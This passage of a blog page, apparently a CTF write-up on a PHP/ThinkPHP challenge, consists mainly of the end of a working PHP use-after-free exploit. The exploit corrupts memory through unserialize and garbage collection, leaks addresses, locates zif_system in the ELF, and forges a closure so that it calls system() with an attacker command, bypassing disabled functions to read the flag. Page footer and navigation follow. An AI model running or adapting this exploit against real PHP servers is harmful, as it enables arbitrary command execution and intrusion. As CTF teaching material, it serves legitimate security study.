+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n_alloc</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
+        <span class="nv">$contiguous</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="mi">79</span><span class="p">);</span>
+
+    <span class="nv">$poc</span> <span class="o">=</span> <span class="s1">'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}'</span><span class="p">;</span>
+    <span class="nv">$out</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>
+    <span class="nb">gc_collect_cycles</span><span class="p">();</span>
+
+    <span class="nv">$v</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">ptr2str</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">79</span><span class="p">);</span>
+    <span class="k">unset</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
+    <span class="nv">$abc</span> <span class="o">=</span> <span class="nv">$out</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="nv">$helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Helper</span><span class="p">;</span>
+    <span class="nv">$helper</span><span class="o">-&gt;</span><span class="n">b</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$x</span><span class="p">)</span> <span class="p">{</span> <span class="p">};</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$abc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">79</span> <span class="o">||</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$abc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"UAF failed"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1"># leaks</span>
+    <span class="nv">$closure_handlers</span> <span class="o">=</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="nv">$php_heap</span> <span class="o">=</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">);</span>
+    <span class="nv">$abc_addr</span> <span class="o">=</span> <span class="nv">$php_heap</span> <span class="o">-</span> <span class="mh">0xc8</span><span class="p">;</span>
+
+    <span class="c1"># fake value</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+
+    <span class="c1"># fake reference</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">);</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">);</span>
+
+    <span class="nv">$closure_obj</span> <span class="o">=</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+
+    <span class="nv">$binary_leak</span> <span class="o">=</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$closure_handlers</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$base</span> <span class="o">=</span> <span class="nf">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Couldn't determine binary base address"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$elf</span> <span class="o">=</span> <span class="nf">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Couldn't parse ELF header"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$basic_funcs</span> <span class="o">=</span> <span class="nf">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Couldn't get basic_functions address"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$zif_system</span> <span class="o">=</span> <span class="nf">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Couldn't get zif_system address"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1"># fake closure object</span>
+    <span class="nv">$fake_obj_offset</span> <span class="o">=</span> <span class="mh">0xd0</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x110</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="nv">$fake_obj_offset</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">,</span> <span class="nf">leak</span><span class="p">(</span><span class="nv">$closure_obj</span><span class="p">,</span> <span class="nv">$i</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="c1"># pwn</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="nv">$fake_obj_offset</span><span class="p">);</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0xd0</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="c1"># internal func type</span>
+    <span class="nf">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0xd0</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$zif_system</span><span class="p">);</span> <span class="c1"># internal func handler</span>
+
+    <span class="p">(</span><span class="nv">$helper</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">)(</span><span class="nv">$cmd</span><span class="p">);</span>
+
+    <span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>访问这个文件，得到flag</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">ctf</a><span class="sep">, </span>
+    
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">php</a><span class="sep">, </span>
+    
+      <a href="/tags/#thinkphp" class="page__taxonomy-item" rel="tag">thinkphp</a><span class="sep">, </span>
+    
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#ctf" class="page__taxonomy-item" rel="tag">ctf</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-03-28T00:00:00+08:00">March 28, 2020</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/ctf/ezsqli/" class="pagination--pager" title="GXYCTF2020 - Ezsqli
+">Previous</a>
+    
+    
+      <a href="/linux-tricks/chmod/" class="pagination--pager" title="Linux - 查看和修改文件权限
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+  </ul>
+</div>
+
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
